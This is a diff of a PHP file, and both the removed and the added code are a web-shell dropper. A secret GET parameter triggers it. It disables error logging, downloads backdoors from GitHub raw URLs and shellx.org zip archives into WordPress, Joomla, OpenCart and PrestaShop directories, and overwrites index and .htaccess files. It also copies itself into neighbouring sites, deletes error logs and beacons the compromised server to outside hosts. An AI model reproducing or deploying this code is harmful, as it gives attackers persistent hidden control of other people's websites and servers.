@@ -1,277 +1,44 @@
-<?php
-if(isset($_GET["sexx"])&&$_GET["sexx"]=="sec"){
-echo'Apache Hec'; 
-echo'<br>';
-echo '<a href="">copy</a>'; }
-if(isset($_GET["h3ct0r"])&&$_GET["h3ct0r"]=="sec"){
- @error_reporting(0);
- @set_time_limit(0);
- @clearstatcache();
- @ini_set('error_log',NULL);
- @ini_set('log_errors',0);
- @ini_set('display_errors', 0);
-function get_contents($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/index.php", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/indeeex.php", 0644);
+<?php 
+if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
+mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
+echo('Eec secra');
+
+$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/und.php');
+$local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
+if(file_put_contents($local, $file));   
+
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0644);
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-options.php", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/wp-activate.php", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/smtphec.php", 0644);
-echo "Hectopat"."<br>";
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/1index.php", 0644);
+$filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
+$locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
+if(file_put_contents($locall, $filee));  
+@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
 
-$hecindex = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/index.php');
-$indexyol = $_SERVER['DOCUMENT_ROOT'] . "/indeeex.php" ; 
-if (file_put_contents ($indexyol, $hecindex));
+$sec31= sexx('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
+$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-lince.php";
+if (file_put_contents ($wpoptionss31, $sec31));
 
-$htaccess = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/.htaccess'); 
-$htaccesss = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess" ;
-if (file_put_contents ($htaccesss, $htaccess));
+$wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/mail.txt');
+$wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-boshe.php"; 
+if (file_put_contents ($wpoptionsssss, $wpoptionssssr));   die();  }
 
-
-$htaccess2 = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/.htaccess'); 
-$htaccesss2 = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess22" ;
-if (file_put_contents ($htaccesss2, $htaccess2));
-
-
-$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/options'); 
-$wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/wp-options.php" ;
-if (file_put_contents ($wpoptionss, $wpoptions));
-
-$dosya = $_SERVER['DOCUMENT_ROOT'] . "/indeex.php";  
-if (file_exists($dosya)) {
-    echo "$dosya  <br>";
-} else {
-    @rename($_SERVER['DOCUMENT_ROOT'] . "/index.php",$_SERVER['DOCUMENT_ROOT'] . "/indeex.php");
-}
-
-$momindex = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/index.php');
-$momindexx = $_SERVER['DOCUMENT_ROOT'] . "/index.php" ; 
-if (file_put_contents($momindexx, $momindex));
-
-$moduler = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/wp-activate.php');
-$modulerr = $_SERVER['DOCUMENT_ROOT'] . "/wp-activate.php";
-if (file_put_contents($modulerr, $moduler));
-
-$smtphec = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/smtphec.php');
-$smtphecc = $_SERVER['DOCUMENT_ROOT'] . "/smtphec.php";
-if (file_put_contents($smtphecc, $smtphec));
-
-$supports = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/anon.php');
-$src = $_SERVER['DOCUMENT_ROOT'] . "/wp-supports.php";
-if (file_put_contents($src, $supports));
-
-$lyda = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/wp-god.php');
-$erc = $_SERVER['DOCUMENT_ROOT'] . "/wp-god.php";
-if (file_put_contents($erc, $lyda));
-
-$secur = get_contents('https://raw.githubusercontent.com/Hrecc/Re/main/wp-secure.php');
-$ercd = $_SERVER['DOCUMENT_ROOT'] . "/wp-secure.php";
-if (file_put_contents($ercd, $secur));
-
-
-$wordpress = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/themes/";
-if (file_exists($wordpress)) {
+$random = rand(1,6);
+$d=$_SERVER['SERVER_NAME'];
+if(file_exists('/tmp/d3dd3d'.$d.$random)) { } else {
+	mkdir('/tmp/d3dd3d'.$d.$random);
+	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
-$sad3 = $_SERVER['DOCUMENT_ROOT']."/wp-admin/css/colors/blue/.htaccess";
- 
-$wpmodul2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/wp-logs.php" ;
-if (file_put_contents($wpmodul2, $moduler));
-if(file_exists($wpmodul2)){
-    echo "sex 1 </br>"; }
-if (file_put_contents($sad3, $htaccess));
-@chmod($sad3, 0444);
-
-
-@copy('http://shellx.org/op/javascripts.zip',$_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip");
-
-$try = ($_SERVER['DOCUMENT_ROOT']."/wp-includes/images/wlw/");
-		$zip2 = new ZipArchive;
-if ($zip2->open($_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip") === TRUE) {
-    $zip2->extractTo($try);
-    $zip2->close();
-    echo "<br>sex2";
-echo "<br>sex2" . "</br>"; }
-unlink($_SERVER['DOCUMENT_ROOT']."/wp-admin/javascripts.zip");
-
-@copy('http://shellx.org/op/smart.zip',$_SERVER['DOCUMENT_ROOT']."/wp-lib.zip");
-	$zip = new ZipArchive;
-if ($zip->open($_SERVER['DOCUMENT_ROOT']."/wp-lib.zip") === TRUE) {
-    $zip->extractTo($_SERVER['DOCUMENT_ROOT']."/");
-    $zip->close();
-@copy($_SERVER['DOCUMENT_ROOT']."/wpindex.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/index.php");
-@copy($_SERVER['DOCUMENT_ROOT']."/wpindex.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/indeex.php");
-@copy($_SERVER['DOCUMENT_ROOT']."/about.php",$_SERVER['DOCUMENT_ROOT']."/wp-admin/about.php");
-	@unlink($_SERVER['DOCUMENT_ROOT']."/wpindex.php");
-	@unlink($_SERVER['DOCUMENT_ROOT']."/about.php");
-	@unlink($_SERVER['DOCUMENT_ROOT']."/wp-lib.zip");
-
-}}
-$jooomla = $_SERVER['DOCUMENT_ROOT'] . "/includes/defines.php";
-if (file_exists($jooomla)) {
+$rr = sexx('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$ss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/index.php" ; 
+if (file_put_contents ($ss, $rr));
 	
-$joomlaexway = $_SERVER['DOCUMENT_ROOT'] . "/administrator/systeam.php";
-if (file_put_contents($joomlaexway, $codeexway));
-
-@copy('http://shellx.org/op/joomlahide.zip',$_SERVER['DOCUMENT_ROOT']."/administrator/help/joomlahide.zip");
-@copy('http://shellx.org/op/joomla.zip',$_SERVER['DOCUMENT_ROOT']."/administrator/help/joomla.zip");
-$try2 = ($_SERVER['DOCUMENT_ROOT']."/administrator/modules/");
-$zip33 = new ZipArchive;
-if ($zip33->open($_SERVER['DOCUMENT_ROOT']."/administrator/help/joomlahide.zip") === TRUE) {
-    $zip33->extractTo($try2);
-    $zip33->close();
-    echo "jsex"."<br>";
-}
-$zip22 = new ZipArchive;
-if ($zip22->open($_SERVER['DOCUMENT_ROOT']."/administrator/help/joomla.zip") === TRUE) {
-    $zip22->extractTo($_SERVER['DOCUMENT_ROOT']."/");
-    $zip22->close();
-    echo 'jsex';
-}
-$joomlahides = $_SERVER['DOCUMENT_ROOT'] . "/administrator/help//image.php";
-if (file_put_contents($joomlahides, $hideuploader));
-
-$ralli = $_SERVER['SERVER_NAME']."/administrator/modules/modules.php";
-$ralli2 = $_SERVER['SERVER_NAME']."/administrator/modules/javascript/js/wp-logs.php";
- 
-  $ded2 = curl_init();
- curl_setopt_array($ded2, [
+$curl3 = curl_init();
+ curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://chat.if2.com.br/loader/hide.php?s='.$ralli."<br>".$ralli2.'',
-    CURLOPT_USERAGENT => 'sec'
+    CURLOPT_URL => 'https://m.blogden.ru/data/data.php?s='.$d.'',
+    CURLOPT_USERAGENT => 'chrome'
 ]);
- $resp = curl_exec($ded2);
- curl_close($ded2);
-}
-$oopencart = $_SERVER['DOCUMENT_ROOT'] . "/system/config/";
-if (file_exists($oopencart)) {
-	
-$opencartex = $_SERVER['DOCUMENT_ROOT'] . "/catalog/view/heck.php" ;
-if (file_put_contents($opencartex, $codeex));
-	
-$openhide = $_SERVER['DOCUMENT_ROOT'] . "/catalog/view/javascript/image.php" ;
-if (file_put_contents($openhide, $hideuploader));
-if(file_exists($openhide)){
-    echo "</br>"."osex";
-	}
-	@copy('http://shellx.org/op/javascripts.zip',$_SERVER['DOCUMENT_ROOT']."/javascript.zip");
-$try21 = ($_SERVER['DOCUMENT_ROOT']."/catalog/view/");
-$zip331 = new ZipArchive;
-if ($zip331->open($_SERVER['DOCUMENT_ROOT']."/javascript.zip") === TRUE) {
-    $zip331->extractTo($try21);
-    $zip331->close();
-    echo "osex";
-}}
-@copy('http://shellx.org/op/options.zip',$_SERVER['DOCUMENT_ROOT']."/options.zip");
-$try23 = ($_SERVER['DOCUMENT_ROOT']."/");
-		$zip23 = new ZipArchive;
-if ($zip23->open($_SERVER['DOCUMENT_ROOT']."/options.zip") === TRUE) {
-    $zip23->extractTo($try23);
-    $zip23->close(); }
-	
-$pretashop = $_SERVER['DOCUMENT_ROOT'] . "/config/smarty.config.inc.php";
-if(file_exists($pretashop)){
-mkdir($_SERVER['DOCUMENT_ROOT'] . "/modules/petra/");
-
-$petrauploader = $_SERVER['DOCUMENT_ROOT'] . "/modules/petra/image.php" ;
-if (file_put_contents($petrauploader, $hideuploader));
-if(file_exists($hector4)){
-    echo "presex"."</br>";
-}}
-
-$indexx = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-activate.php");
-$antiseo = file_get_contents ($_SERVER['DOCUMENT_ROOT']."/indeeex.php");
-$uploadder = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-options.php");
-$hta = file_get_contents($_SERVER['DOCUMENT_ROOT']."/.htaccess22");
-$smtpheec = file_get_contents($_SERVER['DOCUMENT_ROOT']."/smtphec.php");
-$anon = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-supports.php");
-$sup = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-god.php");
-$secure = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-secure.php");
-
-$hec = $_SERVER['DOCUMENT_ROOT'] . "/../";
-@chdir ($hec);
-$files = @scandir ($hec);
-foreach ($files as $file):
-if (@filetype ($file) == "dir")
-{ 
-$yarrak = getcwd(). "/".$file."/wp-options.php";
-if (file_put_contents($yarrak, $uploadder)); 
-$random = getcwd(). "/".$file."/indeex.php";
-if (file_exists($random)) {
-echo ""; }
-else {
-$babba = getcwd(). "/".$file."/index.php";
-@rename(($babba), getcwd(). "/".$file. '/indeex.php');
-}
-$rastgele = getcwd (). "/".$file."/index.php";
-@chmod(($rastgele), 0644);
-if (file_put_contents ($rastgele, $antiseo));
-$rastgelee = getcwd (). "/".$file."/indeeex.php";
-@chmod(($rastgelee), 0644);
-if (file_put_contents ($rastgelee, $antiseo));
-
-$rastgeleee = getcwd (). "/".$file."/.htaccess";
-@chmod(($rastgeleee), 0644);
-if (file_put_contents ($rastgeleee, $hta));
-@chmod(($rastgeleee), 0444);
-$nobody = getcwd (). "/".$file."/wp-activate.php";
-if (file_put_contents ($nobody, $indexx));
-
-$ratgele4 = getcwd (). "/".$file."/smtphec.php";
-@chmod(($ratgele4), 0644);
-if (file_put_contents ($ratgele4, $smtpheec));
-
-$ratgele5 = getcwd (). "/".$file."/wp-supports.php";
-@chmod(($ratgele5), 0644);
-if (file_put_contents ($ratgele5, $anon));
-
-$ratgele6 = getcwd (). "/".$file."/wp-god.php";
-@chmod(($ratgele6), 0644);
-if (file_put_contents ($ratgele6, $sup));
-
-$ratgele7 = getcwd (). "/".$file."/wp-secure.php";
-@chmod(($ratgele7), 0644);
-if (file_put_contents ($ratgele7, $secure));
-
-
-$simple = $file."/wp-includes/SimplePie/";
-if (file_exists($simple)) { 
-$index = getcwd (). "/".$file."/wp-includes/SimplePie/wp-logs.php";
-if (file_put_contents ($index, $indexx));
-echo "<hr color='red'>Wordpress <font color='green'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
-
-}
-$joomlasex = $file."/administrator/modules/";
-if (file_exists($joomlasex)) { 
-$joomla = getcwd (). "/".$file."/administrator/modules/modules.php";
-if (file_put_contents ($joomla, $indexx));
-echo "<hr color='red'>Joomla <font color='blue'>$joomla&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
-
-}
-$opencartsex = $file."/catalog/view/";
-if (file_exists($opencartsex)) {
-	$opencart = getcwd (). "/".$file."/catalog/view/configs.php";
-if (file_put_contents ($opencart, $indexx));
-echo "<hr color='red'>Opencart <font color='red'>$opencart&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
-}
-echo "<hr color='red'><font color='#9900FF'>$random&nbsp&nbsp&nbsp&nbsp</font><font color='blue'></font>";
- }
-        endforeach;
-@unlink('error_log');
-@unlink($_SERVER['DOCUMENT_ROOT'] . "/error_log");
-@unlink($_SERVER['DOCUMENT_ROOT'] . "/options.zip");
-@unlink($_SERVER['DOCUMENT_ROOT'] . "/onlyindex.zip");
-@unlink($_SERVER['DOCUMENT_ROOT'] . "/javascript.zip"); 
-}
-
-?>
+ $resp3 = curl_exec($curl3);
+ curl_close($curl3);	
+} ?>
